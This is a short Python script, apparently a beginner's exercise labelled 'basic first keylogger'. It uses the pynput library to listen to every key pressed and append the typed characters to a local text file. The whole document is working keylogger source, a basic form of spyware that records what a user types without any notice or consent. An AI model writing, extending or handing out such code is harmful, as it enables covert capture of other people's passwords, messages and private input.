from pynput import keyboard


def keyPressed(key):
    print(str(key))
    with open("keyfile.txt", 'a') as logKey: #open up a file (append)
        try:
            char = key.char
            logKey.write(char)
        except:
            print("Error getting char")
if __name__ == "__main__":
    listener = keyboard.Listener(on_press=keyPressed)
    listener.start()
    input()

#basic first keylogger